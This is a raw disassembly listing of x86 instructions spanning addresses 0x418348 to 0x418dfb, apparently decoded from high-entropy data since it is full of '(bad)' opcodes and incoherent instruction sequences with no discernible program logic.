  418348:	(bad)  
  418349:	adc    DWORD PTR [ebp-0x215124a9],ebx
  41834f:	and    DWORD PTR [ecx],edi
  418351:	mov    ah,0x33
  418353:	test   al,0x6b
  418355:	leave  
  418356:	or     BYTE PTR [edx],ah
  418358:	mov    ebp,0x438b32b4
  41835d:	jmp    0x246467dc
  418362:	ficom  DWORD PTR [ebx-0x2989483f]
  418368:	mov    ah,ah
  41836a:	jnp    0x41832b
  41836c:	sti    
  41836d:	inc    edi
  41836e:	pop    ecx
  41836f:	(bad)  
  418370:	jmp    0x4183ac
  418372:	push   edx
  418373:	cld    
  418374:	retf   0x73a9
  418377:	mov    al,0x93
  418379:	ss mov dh,0x85
  41837c:	sub    BYTE PTR [ebx+eiz*8],ch
  41837f:	mov    eax,0xe9ae8028
  418384:	jnp    0x418367
  418386:	or     dl,BYTE PTR gs:[esi-0x6]
  41838a:	inc    ecx
  41838b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41838c:	mov    al,0x26
  41838e:	dec    edi
  41838f:	dec    ebx
  418390:	sldt   WORD PTR [eax]
	...
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	test   ebx,ebx
  418402:	stos   BYTE PTR es:[edi],al
  418403:	cmp    al,dl
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR ds:0x70000001,al
  41840d:	push   ss
  41840e:	xchg   ecx,eax
  41840f:	mov    esi,0xe95ff2b7
  418414:	xchg   ebp,eax
  418415:	xor    eax,0xabfbd654
  41841a:	and    ah,BYTE PTR [edi]
  41841c:	ins    DWORD PTR es:[edi],dx
  41841d:	pop    ebp
  41841e:	rcr    DWORD PTR [edi+0x0],1
  418421:	inc    ecx
  418422:	mov    ah,bh
  418424:	addr16 (bad) 
  418427:	iret   
  418428:	cli    
  418429:	test   eax,0x36b8e70
  41842e:	in     al,0x28
  418430:	(bad)  [edx+0x54]
  418433:	test   eax,0x7a441e39
  418438:	and    ecx,DWORD PTR ds:0xd421c1df
  41843e:	(bad)  
  41843f:	sbb    eax,0x5da6fb6d
  418444:	fwait
  418445:	in     eax,dx
  418446:	xchg   edx,eax
  418447:	add    ebp,DWORD PTR [ebx-0x77]
  41844a:	add    ch,bh
  41844c:	lahf   
  41844d:	enter  0x65b5,0xc1
  418451:	cmp    DWORD PTR [ebx],esi
  418453:	mov    esp,0xee13c343
  418458:	push   ss
  418459:	sbb    BYTE PTR [ecx-0x4],dl
  41845c:	adc    dl,dh
  41845e:	sub    esi,ecx
  418460:	(bad)  
  418461:	cmp    eax,0x97511e1c
  418466:	idiv   DWORD PTR [ebp+0x30]
  418469:	call   0x25a7:0x19d8f50e
  418470:	add    DWORD PTR [edi+0x4b],ecx
  418473:	xchg   BYTE PTR [esi+0x2b0f241d],ah
  418479:	mov    edx,0xdf9d4e88
  41847e:	scas   al,BYTE PTR es:[edi]
  41847f:	mov    ebx,DWORD PTR [esi+0x4a44377b]
  418485:	pop    cx
  418487:	std    
  418488:	call   edx
  41848a:	adc    DWORD PTR [ebx+edx*4],ebx
  41848d:	test   BYTE PTR ds:[eax+0x76cef22],dh
  418494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418495:	pop    ds
  418496:	mov    ecx,0xea824683
  41849b:	enter  0xabbc,0x52
  41849f:	xor    esp,DWORD PTR [eax+esi*8+0x71]
  4184a3:	mov    bl,0x1
  4184a5:	pusha  
  4184a6:	sub    al,0xf4
  4184a8:	call   esp
  4184aa:	out    dx,al
  4184ab:	lods   al,BYTE PTR ds:[esi]
  4184ac:	adc    BYTE PTR [edx+0xdff831d],bh
  4184b2:	int3   
  4184b3:	xlat   BYTE PTR ds:[ebx]
  4184b4:	and    eax,0x448f42e5
  4184b9:	stos   BYTE PTR es:[edi],al
  4184ba:	xor    bh,BYTE PTR [esp+edi*2-0x64]
  4184be:	dec    esi
  4184bf:	mov    eax,0xe490f4fd
  4184c4:	adc    al,0x0
  4184c6:	ss cdq 
  4184c8:	cld    
  4184c9:	fwait
  4184ca:	sub    dh,BYTE PTR [eax-0x3a0f9a8d]
  4184d0:	in     al,dx
  4184d1:	cs je  0x418510
  4184d4:	and    DWORD PTR [eax-0x2a3cfc03],edx
  4184da:	xchg   ecx,eax
  4184db:	xchg   edi,eax
  4184dc:	aas    
  4184dd:	xchg   BYTE PTR [eax],cl
  4184df:	dec    esi
  4184e0:	sbb    al,0x6b
  4184e2:	loop   0x4184e5
  4184e4:	pop    es
  4184e5:	div    BYTE PTR [edx+0x55]
  4184e8:	scas   eax,DWORD PTR es:[edi]
  4184e9:	xchg   edi,eax
  4184ea:	add    eax,0x3dcb943c
  4184ef:	mov    bl,0x55
  4184f1:	dec    edx
  4184f2:	je     0x4184cc
  4184f4:	xchg   esp,eax
  4184f5:	outs   dx,BYTE PTR ds:[esi]
  4184f6:	call   0x45926c51
  4184fb:	adc    BYTE PTR [esi],bl
  4184fd:	mov    edx,0xdab6f1ad
  418502:	xor    BYTE PTR [ebp+0x58],bh
  418505:	mov    ds:0xd88835b0,al
  41850a:	in     eax,dx
  41850b:	add    al,dl
  41850d:	mov    al,0xfc
  41850f:	test   BYTE PTR [eax+0x0],bh
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	adc    al,0xc5
  418582:	xlat   BYTE PTR ds:[ebx]
  418583:	mov    ebp,0x101c7
  418588:	add    eax,0x9d000001
  41858d:	or     eax,0xf431c969
  418592:	fimul  WORD PTR [ebx]
  418594:	and    eax,0xff9225d8
  418599:	popa   
  41859a:	lods   eax,DWORD PTR ds:[esi]
  41859b:	shl    DWORD PTR ds:0x363dbe75,0xd3
  4185a2:	push   esp
  4185a3:	push   0xffffff80
  4185a5:	pushf  
  4185a6:	call   0xefe3:0x206211df
  4185ad:	and    BYTE PTR [esi-0x54dfc318],ah
  4185b3:	fcomp  QWORD PTR [esi+0x1d]
  4185b6:	mov    DWORD PTR [edi-0x4699c99e],esi
  4185bc:	idiv   BYTE PTR ds:0x8957a12d
  4185c2:	push   ds
  4185c3:	push   ebx
  4185c4:	mov    ch,ah
  4185c6:	push   ebx
  4185c7:	or     bh,BYTE PTR [eax]
  4185c9:	pop    esi
  4185ca:	push   cs
  4185cb:	add    edi,DWORD PTR [edx+esi*1-0x6c]
  4185cf:	mov    cl,0x59
  4185d1:	popa   
  4185d2:	dec    eax
  4185d3:	mov    eax,0x828dd5ca
  4185d8:	fisttp QWORD PTR [esi]
  4185da:	dec    ecx
  4185db:	loope  0x418573
  4185dd:	and    DWORD PTR [ecx],0xffffffb7
  4185e0:	test   edi,esp
  4185e2:	bound  edi,QWORD PTR [esi+edi*4]
  4185e5:	sti    
  4185e6:	xor    DWORD PTR [eax+esi*8-0x617e0594],edi
  4185ed:	clc    
  4185ee:	adc    DWORD PTR [edi+esi*1],edx
  4185f1:	xchg   BYTE PTR [ebx],bl
  4185f3:	mov    ecx,0xaa1b9088
  4185f8:	ret    0xa604
  4185fb:	add    al,0x93
  4185fd:	loopne 0x41859b
  4185ff:	mov    bl,0x87
  418601:	mov    esi,0x9851c806
  418606:	xor    dl,ah
  418608:	fisttp DWORD PTR [eax]
  41860a:	sub    edi,esp
  41860c:	outs   dx,DWORD PTR ds:[esi]
  41860d:	adc    ah,BYTE PTR [ebx]
  41860f:	sub    al,0x1c
  418611:	mov    ecx,?
  418613:	out    dx,eax
  418614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418615:	add    cl,dh
  418617:	dec    edx
  418618:	call   0xa290:0x187bf3d2
  41861f:	sbb    al,0xbe
  418621:	gs jge 0x418699
  418624:	and    esi,DWORD PTR [ebp-0x17e378b9]
  41862a:	sub    eax,0xe5e18534
  41862f:	cmp    cl,BYTE PTR [esi]
  418631:	pop    eax
  418632:	add    DWORD PTR [esi+ebx*2+0x53],ecx
  418636:	test   DWORD PTR [esi+0x24194961],0x95a6f3c6
  418640:	pop    edx
  418641:	push   ecx
  418642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418643:	popa   
  418644:	jl     0x418685
  418646:	repz jg 0x4185f8
  418649:	idiv   DWORD PTR cs:[edi+0x22]
  41864d:	and    DWORD PTR [ebx],eax
  41864f:	into   
  418650:	mov    esp,0x35b0eda9
  418655:	sub    edi,esp
  418657:	xor    bl,dh
  418659:	push   ebp
  41865a:	mov    eax,0xc6661a56
  41865f:	lds    esi,FWORD PTR [edi+0x58]
  418662:	lahf   
  418663:	push   eax
  418664:	mov    bl,0x7f
  418666:	call   DWORD PTR ds:0xfe6a8e23
  41866c:	test   eax,0xdeb816c8
  418671:	sti    
  418672:	mov    ecx,0xa30f27b0
  418677:	jl     0x4185fd
  418679:	rcr    BYTE PTR [eax+0x26],0x37
  41867d:	xchg   ebx,eax
  41867e:	outs   dx,BYTE PTR ds:[esi]
  41867f:	push   eax
  418680:	(bad)  
  418681:	inc    BYTE PTR [ecx]
  418683:	iret   
  418684:	push   0x2ee80723
  418689:	mov    esp,0x2407ab50
  41868e:	cmp    dl,0xa7
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	xor    DWORD PTR ds:0x2cc7f0a,0x1050001
  41870a:	add    BYTE PTR [eax],al
  41870c:	ins    DWORD PTR es:[edi],dx
  41870d:	adc    DWORD PTR [edi+0x79],ebx
  418710:	sahf   
  418711:	jne    0x418778
  418713:	add    eax,0xacd682cf
  418718:	icebp  
  418719:	push   cs
  41871a:	sbb    ebx,edi
  41871c:	mov    BYTE PTR [eax-0x3145c4d8],ah
  418722:	or     BYTE PTR [ecx+edi*4-0x6d],ah
  418726:	fs cmp al,0x6f
  418729:	add    eax,0xee4e5f14
  41872e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872f:	sahf   
  418730:	in     al,0xa0
  418732:	push   0xa25816cf
  418737:	cmp    cl,bl
  418739:	outs   dx,BYTE PTR ds:[esi]
  41873a:	mov    cl,0x3c
  41873c:	push   cs
  41873d:	mov    cl,0xa9
  41873f:	cmc    
  418740:	ja     0x41870a
  418742:	lahf   
  418743:	mov    esi,0x20d245ed
  418748:	(bad)  
  418749:	pop    ds
  41874a:	mov    ah,0x7b
  41874c:	out    dx,al
  41874d:	ret    0xfb22
  418750:	sub    ah,BYTE PTR [edi-0x1a]
  418753:	(bad)  
  418754:	xlat   BYTE PTR ds:[ebx]
  418755:	mov    ds:0x6ff6b0e9,eax
  41875a:	jp     0x4187be
  41875c:	hlt    
  41875d:	dec    edi
  41875e:	push   edx
  41875f:	ret    0xe498
  418762:	and    eax,0xe07faace
  418767:	cwde   
  418768:	push   ds
  418769:	and    esp,DWORD PTR [eax+ebx*1]
  41876c:	dec    esi
  41876d:	ins    DWORD PTR es:[edi],dx
  41876e:	lds    edi,FWORD PTR [ebx]
  418770:	push   ebx
  418771:	lea    esi,[ecx]
  418773:	inc    ebx
  418774:	jns    0x418703
  418776:	pop    ss
  418777:	cmp    BYTE PTR [edi-0x5c],al
  41877a:	pusha  
  41877b:	pushf  
  41877c:	inc    ebx
  41877d:	and    BYTE PTR [eax-0x41],ch
  418780:	push   ds
  418781:	pop    eax
  418782:	in     al,0xae
  418784:	adc    dl,cl
  418786:	mov    edx,0x70c15c67
  41878b:	and    esp,edx
  41878d:	fnstcw WORD PTR [ebx-0x59]
  418790:	fst    DWORD PTR [ecx+eax*2+0x34]
  418794:	fwait
  418795:	jmp    0xa720:0xae89f1af
  41879c:	push   edi
  41879d:	cs push 0x2bb60560
  4187a3:	push   esi
  4187a4:	es ss cli 
  4187a7:	pop    ebx
  4187a8:	fisttp QWORD PTR [edi+0x8791de]
  4187ae:	jmp    DWORD PTR [esi-0x2006df14]
  4187b4:	sub    BYTE PTR [eax],cl
  4187b6:	rcl    BYTE PTR [edx+0x4],0x89
  4187ba:	push   ecx
  4187bb:	jne    0x4187df
  4187bd:	test   DWORD PTR [ebx+0x32],esi
  4187c0:	mov    bl,0x8e
  4187c2:	imul   ebp,DWORD PTR [eax-0x437a1ef2],0x4fa125ac
  4187cc:	call   0xa65295b0
  4187d1:	push   0x7f
  4187d3:	cmp    al,0x33
  4187d5:	aas    
  4187d6:	inc    esp
  4187d7:	adc    eax,0xfe9f5808
  4187dc:	arpl   WORD PTR [esi+0x75d7d6bb],di
  4187e2:	mov    ebp,0x141b0928
  4187e7:	mul    BYTE PTR [esi-0x63]
  4187ea:	int3   
  4187eb:	xlat   BYTE PTR ds:[ebx]
  4187ec:	aas    
  4187ed:	pop    edx
  4187ee:	cld    
  4187ef:	ds inc ecx
  4187f1:	popf   
  4187f2:	inc    edx
  4187f3:	mov    ecx,0x87cf6cd7
  4187f8:	dec    ebp
  4187f9:	xor    DWORD PTR [esi],esp
  4187fb:	das    
  4187fc:	cwde   
  4187fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187fe:	dec    esi
  4187ff:	mov    ecx,0x68cd3e64
  418804:	and    esp,DWORD PTR [edx-0x45f5efd1]
  41880a:	loop   0x418851
  41880c:	ja     0x41883e
  41880e:	jl     0x4187f8
  418810:	pop    ecx
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x1163c533]
  418881:	and    eax,0x3d127af
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x4000001
  41888d:	nop
  41888e:	sub    eax,0xe9d06fd
  418893:	rdmsr  
  418895:	mov    dh,0x6d
  418897:	inc    ebp
  418898:	call   0xcb906819
  41889d:	addr16 rol ebp,cl
  4188a0:	(bad)  
  4188a1:	fnsave [edi]
  4188a3:	pop    ecx
  4188a4:	inc    edi
  4188a5:	add    ecx,DWORD PTR [ebp+0x503dfbaa]
  4188ab:	into   
  4188ac:	sar    ebx,1
  4188ae:	xor    DWORD PTR [eax+0x4d],ebx
  4188b1:	pop    ebp
  4188b2:	mov    dl,0xcc
  4188b4:	cld    
  4188b5:	cdq    
  4188b6:	fwait
  4188b7:	sub    BYTE PTR [ecx+0x7c10910c],dl
  4188bd:	repnz scas eax,DWORD PTR es:[edi]
  4188bf:	jge    0x4188c8
  4188c1:	push   0xffffffb8
  4188c3:	fidivr DWORD PTR [edi]
  4188c5:	pop    ebp
  4188c6:	fsubr  DWORD PTR [edx-0x29ed8be9]
  4188cc:	lds    ebp,FWORD PTR [eax]
  4188ce:	xrelease xchg DWORD PTR es:[ecx+ebx*1+0x379acfef],eax
  4188d7:	mov    ch,0x9d
  4188d9:	adc    BYTE PTR [eax-0x2],0x7e
  4188dd:	cmpxchg BYTE PTR ds:[edx+0x75],cl
  4188e2:	jno    0x418909
  4188e4:	xchg   edx,eax
  4188e5:	pop    edx
  4188e6:	mov    edx,0xb52524f0
  4188eb:	dec    edx
  4188ec:	cdq    
  4188ed:	mov    al,0x37
  4188ef:	mov    WORD PTR [ebx-0x50],gs
  4188f2:	inc    ebp
  4188f3:	(bad)  
  4188f4:	lea    ebx,ss:[edi+0x1b]
  4188f8:	mov    dh,0x2
  4188fa:	idiv   DWORD PTR [ebx-0x6da310d9]
  418900:	call   0x8ee6926e
  418905:	xor    cl,ch
  418907:	call   0x5f7cceb7
  41890c:	test   BYTE PTR [eax-0x74],bl
  41890f:	jecxz  0x418949
  418911:	xor    bh,BYTE PTR [ecx+edx*4+0x33]
  418915:	call   0x15b07325
  41891a:	call   0x485d:0x19994fb6
  418921:	inc    edi
  418922:	push   edi
  418923:	push   ebx
  418924:	ret    
  418925:	pushf  
  418926:	inc    edi
  418927:	cmp    ecx,esp
  418929:	sub    eax,DWORD PTR [ebx+ebp*8+0x1e5ea366]
  418930:	out    0xf1,al
  418932:	out    0x42,al
  418934:	fidiv  DWORD PTR [edx]
  418936:	cli    
  418937:	xchg   esp,eax
  418938:	adc    al,0xb8
  41893a:	lods   al,BYTE PTR ds:[esi]
  41893b:	test   DWORD PTR [ebx],esp
  41893d:	icebp  
  41893e:	jb     0x418948
  418940:	jo     0x418967
  418942:	xor    eax,0x8ce76663
  418947:	pop    ecx
  418948:	xchg   edx,eax
  418949:	fs nop
  41894b:	ins    DWORD PTR es:[edi],dx
  41894c:	test   ebx,edx
  41894e:	push   edi
  41894f:	call   0xcc17:0x83ad7531
  418956:	push   ebx
  418957:	nop
  418958:	jnp    0x418946
  41895a:	adc    DWORD PTR [esi+0x7ff83490],eax
  418960:	idiv   DWORD PTR [edx+0x8]
  418963:	call   0x6866:0xa58260cb
  41896a:	mov    ebp,0xacfd31ad
  41896f:	jle    0x4188f6
  418971:	xchg   ebp,eax
  418972:	lods   eax,DWORD PTR ds:[esi]
  418973:	retf   
  418974:	aad    0xf3
  418976:	cmc    
  418977:	sub    DWORD PTR [edx],ecx
  418979:	(bad)  [eax]
  41897b:	icebp  
  41897c:	daa    
  41897d:	push   ss
  41897e:	push   es
  41897f:	xor    ch,BYTE PTR [eax-0x46]
  418982:	mov    edi,0x837a3622
  418987:	push   ecx
  418988:	mov    ds:0xeac0467,eax
  41898d:	push   edi
  41898e:	pop    eax
  41898f:	mov    cl,0xd1
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xaf764969
  418a03:	rcl    dh,cl
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xe8000001,al
  418a0d:	ss cld 
  418a0f:	dec    ecx
  418a10:	in     eax,0xb0
  418a12:	mov    eax,0x7299474
  418a17:	mov    bh,0x27
  418a19:	div    DWORD PTR [ecx]
  418a1b:	cmp    eax,0x42659ba3
  418a20:	(bad)  
  418a21:	fisttp QWORD PTR [esi+edi*4+0x5a]
  418a25:	ds xor eax,0xf012ac79
  418a2b:	xchg   edi,eax
  418a2c:	inc    ecx
  418a2d:	mov    DWORD PTR [eax-0x67553c59],edi
  418a33:	push   esi
  418a34:	adc    eax,0x3a6b11d2
  418a39:	jns    0x418a5b
  418a3b:	jle    0x4189e9
  418a3d:	sub    bh,BYTE PTR [ecx+0x42]
  418a40:	mov    DWORD PTR [edx],ebx
  418a42:	pop    eax
  418a43:	inc    edi
  418a44:	add    ebp,DWORD PTR [ebp+ebx*1-0x21d2343c]
  418a4b:	pop    ss
  418a4c:	cmp    esp,DWORD PTR [ebx]
  418a4e:	lock sti 
  418a50:	ds cwde 
  418a52:	pop    edi
  418a53:	into   
  418a54:	addr16 inc esp
  418a56:	adc    edi,DWORD PTR [esp]
  418a59:	jge    0x418a38
  418a5b:	mov    bl,0xd6
  418a5d:	sub    eax,0x3c435384
  418a62:	pop    edx
  418a63:	test   eax,0x2a68236e
  418a68:	clc    
  418a69:	in     eax,0x80
  418a6b:	cdq    
  418a6c:	add    esp,esp
  418a6e:	inc    esi
  418a6f:	dec    ebp
  418a70:	push   0x42
  418a72:	xor    al,0x63
  418a74:	or     bl,BYTE PTR [edx+0x31]
  418a77:	gs xchg esi,eax
  418a79:	out    0xaf,eax
  418a7b:	popf   
  418a7c:	call   0xc14616a5
  418a81:	mov    bl,0x4f
  418a83:	call   0x37bc:0x7657b5b0
  418a8a:	xor    DWORD PTR [ebp+0x6f584921],0x977aca96
  418a94:	jae    0x418a57
  418a96:	sub    al,0x3f
  418a98:	fwait
  418a99:	sub    al,0x6f
  418a9b:	daa    
  418a9c:	jno    0x418af9
  418a9e:	ds adc eax,0x2ae0caeb
  418aa4:	ss das 
  418aa6:	pop    esp
  418aa7:	aam    0x7b
  418aa9:	or     al,0x7b
  418aab:	mov    bh,0xf5
  418aad:	dec    esi
  418aae:	sbb    esi,DWORD PTR [edx+ecx*8]
  418ab1:	jg     0x418b2c
  418ab3:	pop    ds
  418ab4:	sbb    eax,0xde3b86e8
  418ab9:	dec    ecx
  418aba:	js     0x418b02
  418abc:	daa    
  418abd:	xchg   edi,eax
  418abe:	cs pop edi
  418ac0:	and    dl,dh
  418ac2:	fmul   DWORD PTR [ecx]
  418ac4:	rol    DWORD PTR [esi+0x14d05899],1
  418aca:	into   
  418acb:	pop    edx
  418acc:	push   esp
  418acd:	cmp    ecx,ebx
  418acf:	adc    bh,BYTE PTR [ebx+0x45]
  418ad2:	sbb    bl,al
  418ad4:	stc    
  418ad5:	sar    BYTE PTR [esi],1
  418ad7:	nop
  418ad8:	xor    ebx,DWORD PTR [ebx-0x17]
  418adb:	mov    dl,0xca
  418add:	pop    ebp
  418ade:	mov    esp,0x40d6138b
  418ae3:	imul   BYTE PTR [eax+0x83ba6c2]
  418ae9:	jge    0x418afb
  418aeb:	mov    bl,0xe0
  418aed:	jne    0x418b3f
  418aef:	in     eax,0x7e
  418af1:	xor    esp,ebp
  418af3:	fimul  DWORD PTR [edx]
  418af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af6:	add    BYTE PTR [ebx-0x29ebd949],ah
  418afc:	mov    ?,WORD PTR [eax-0x33]
  418aff:	fcmovbe st,st(6)
  418b01:	int    0x99
  418b03:	loopne 0x418b58
  418b05:	inc    esi
  418b06:	or     eax,0x7bc159a7
  418b0b:	jg     0x418b1a
  418b0d:	clc    
  418b0e:	(bad)  
  418b0f:	cwde   
  418b10:	xchg   edi,eax
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x1f
  418b81:	aad    0xa4
  418b83:	add    al,0xdb
  418b85:	add    eax,0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	(bad)  
  418b8d:	rol    DWORD PTR [edx+edi*4],1
  418b90:	cmp    BYTE PTR [edi],cl
  418b92:	clc    
  418b93:	fcomip st,st(6)
  418b95:	adc    DWORD PTR [ecx+0x35],edx
  418b98:	cmp    eax,DWORD PTR [esi+0x52]
  418b9b:	mov    ebp,0xbc94d5e9
  418ba0:	test   al,0xc2
  418ba2:	xchg   esi,eax
  418ba3:	retf   
  418ba4:	ret    0xc9b9
  418ba7:	xchg   edx,eax
  418ba8:	jmp    0xfea4:0x3eff6759
  418baf:	nop
  418bb0:	push   edx
  418bb1:	dec    esi
  418bb2:	fdivr  DWORD PTR [ebx-0x355f0adf]
  418bb8:	mov    cl,0xc8
  418bba:	jmp    0xe725:0x528b9f35
  418bc1:	rcl    ch,1
  418bc3:	xchg   BYTE PTR [esi-0x255252bb],cl
  418bc9:	mov    esp,0xf58c88e7
  418bce:	dec    DWORD PTR [edx-0x25fca54c]
  418bd4:	adc    eax,DWORD PTR [edi]
  418bd6:	in     al,dx
  418bd7:	jmp    0x418c35
  418bd9:	std    
  418bda:	scas   eax,DWORD PTR es:[edi]
  418bdb:	push   ebx
  418bdc:	mov    ebx,0xa5fe5604
  418be1:	fdivr  DWORD PTR [ebp-0x8dc657]
  418be7:	add    DWORD PTR [edx-0x10],ebp
  418bea:	je     0x418c25
  418bec:	fldcw  WORD PTR [edi+0x53]
  418bef:	push   0x78
  418bf1:	add    bl,bl
  418bf3:	je     0x418c26
  418bf5:	jne    0x418bfe
  418bf7:	test   al,0x94
  418bf9:	jge    0x418b93
  418bfb:	fisub  WORD PTR ds:0xa697594e
  418c01:	cmp    al,0x9e
  418c03:	scas   al,BYTE PTR es:[edi]
  418c04:	pop    esi
  418c05:	cmp    al,0xe1
  418c07:	mov    ch,0xd3
  418c09:	loop   0x418c70
  418c0b:	stos   DWORD PTR es:[edi],eax
  418c0c:	pusha  
  418c0d:	or     al,0x32
  418c0f:	popf   
  418c10:	mov    ds:0x3410f2e7,eax
  418c15:	clc    
  418c16:	cdq    
  418c17:	add    DWORD PTR [edx+0x10],eax
  418c1a:	and    DWORD PTR [edx-0x2ea8f569],esp
  418c20:	dec    edx
  418c21:	add    dl,dl
  418c23:	ret    
  418c24:	dec    edi
  418c25:	int    0x25
  418c27:	xlat   BYTE PTR ds:[ebx]
  418c28:	xchg   ecx,eax
  418c29:	lock pop eax
  418c2b:	jmp    0x418bbe
  418c2d:	sbb    al,0x6c
  418c2f:	in     al,0xec
  418c31:	mov    cl,0x81
  418c33:	ja     0x418c26
  418c35:	pop    ss
  418c36:	jmp    0x6c02:0x8319e56
  418c3d:	out    dx,eax
  418c3e:	sbb    ch,BYTE PTR [ebx-0x490f657d]
  418c44:	pop    eax
  418c45:	cmp    dh,BYTE PTR [ebx-0x536b8cbb]
  418c4b:	lods   eax,DWORD PTR ds:[esi]
  418c4c:	jle    0x418ccd
  418c4e:	xor    DWORD PTR [eax],edx
  418c50:	and    dl,cl
  418c52:	test   BYTE PTR [eax-0x210a4803],ah
  418c58:	and    esp,ebp
  418c5a:	gs xor eax,0x7fad1725
  418c60:	dec    edx
  418c61:	pop    esp
  418c62:	sbb    al,0x4e
  418c64:	mov    eax,DWORD PTR [ecx+eax*1-0x45]
  418c68:	xor    BYTE PTR ds:0x17c8eb54,dl
  418c6e:	ret    0x7186
  418c71:	std    
  418c72:	jae    0x418cc2
  418c74:	or     eax,0xe8b64658
  418c79:	outs   dx,BYTE PTR ds:[esi]
  418c7a:	retf   
  418c7b:	pop    esp
  418c7c:	test   al,0x10
  418c7e:	and    esi,edx
  418c80:	mov    cl,0x9e
  418c82:	jmp    0xe94e:0x35755d8a
  418c89:	sar    BYTE PTR [ecx],1
  418c8b:	pop    es
  418c8c:	test   bl,bh
  418c8e:	and    eax,eax
  418c90:	out    dx,eax
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [edx],cl
  418d01:	mov    al,ds:0x6e0af64
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0xcc000001
  418d0d:	enter  0x560c,0x16
  418d11:	stc    
  418d12:	out    0x54,eax
  418d14:	push   ss
  418d15:	mov    dl,0x5c
  418d17:	mov    al,0x16
  418d19:	mov    cl,0x1c
  418d1b:	dec    edi
  418d1c:	ja     0x418d06
  418d1e:	add    al,0x13
  418d20:	push   esi
  418d21:	jo     0x418d90
  418d23:	lock jno 0x418cc6
  418d26:	jno    0x418d71
  418d28:	inc    ebx
  418d29:	shl    DWORD PTR [edi-0x6e],1
  418d2c:	mov    ?,WORD PTR [edi]
  418d2e:	mov    edi,0x4743ae90
  418d33:	int3   
  418d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d35:	mov    esi,0x60de2366
  418d3a:	jle    0x418cbc
  418d3c:	lahf   
  418d3d:	ins    DWORD PTR es:[edi],dx
  418d3e:	mov    ecx,0xcd3feafd
  418d43:	mov    esi,0x62dae585
  418d48:	imul   eax,DWORD PTR ds:0x44c1d790,0x7276a595
  418d52:	add    DWORD PTR [edi],0xffffff80
  418d55:	sub    DWORD PTR [esi],eax
  418d57:	add    BYTE PTR [esi],0x7e
  418d5a:	imul   edx,DWORD PTR [ebx-0x35],0x36
  418d5e:	pushf  
  418d5f:	into   
  418d60:	inc    edi
  418d61:	es inc edi
  418d63:	mov    ch,0x7f
  418d65:	adc    eax,0x5aca15fe
  418d6a:	adc    ch,BYTE PTR [ebp-0x454efccb]
  418d70:	mov    esi,0xa08dae63
  418d75:	mov    ecx,0x9dd9346e
  418d7a:	or     BYTE PTR [edi-0x58e1092a],ah
  418d80:	stos   BYTE PTR es:[edi],al
  418d81:	pushf  
  418d82:	jl     0x418df3
  418d84:	(bad)  
  418d85:	popf   
  418d86:	iret   
  418d87:	pop    esi
  418d88:	dec    ebx
  418d89:	je     0x418d7d
  418d8b:	imul   ebx,DWORD PTR [eax-0x269f816b],0x14
  418d92:	adc    edx,DWORD PTR [ecx]
  418d94:	cmp    esi,DWORD PTR [esi-0x76]
  418d97:	dec    edi
  418d98:	dec    esp
  418d99:	xchg   esi,eax
  418d9a:	mov    edi,?
  418d9c:	lods   al,BYTE PTR ds:[esi]
  418d9d:	pop    esp
  418d9e:	or     ch,al
  418da0:	shr    DWORD PTR [eax-0x4e],1
  418da3:	hlt    
  418da4:	jb     0x418d79
  418da6:	xchg   ebp,eax
  418da7:	in     al,dx
  418da8:	push   esi
  418da9:	mov    bh,0xca
  418dab:	je     0x418d9b
  418dad:	mov    edx,0xffaa0c7f
  418db2:	enter  0x2a90,0xc7
  418db6:	call   0x75910fb4
  418dbb:	jns    0x418d9d
  418dbd:	enter  0x53db,0xb3
  418dc1:	rcr    BYTE PTR [eax+0x3f056a29],1
  418dc7:	(bad)  
  418dc8:	loopne 0x418dae
  418dca:	retf   
  418dcb:	cmp    ah,BYTE PTR [esi-0x5]
  418dce:	xor    BYTE PTR [edx+0x350e20cc],bh
  418dd4:	mov    eax,ds:0x12f07b52
  418dd9:	sbb    bh,al
  418ddb:	jns    0x418dfd
  418ddd:	mov    ds:0xc5a5a953,al
  418de2:	sub    eax,0x79f4f462
  418de7:	pop    edi
  418de8:	xchg   edi,eax
  418de9:	mov    eax,0xb7528f2a
  418dee:	inc    edx
  418def:	mov    esi,0x146ffa5b
  418df4:	mov    al,ds:0xd0d2b86e
  418df9:	jge    0x418dbb
  418dfb:	mov    dh,0xd3
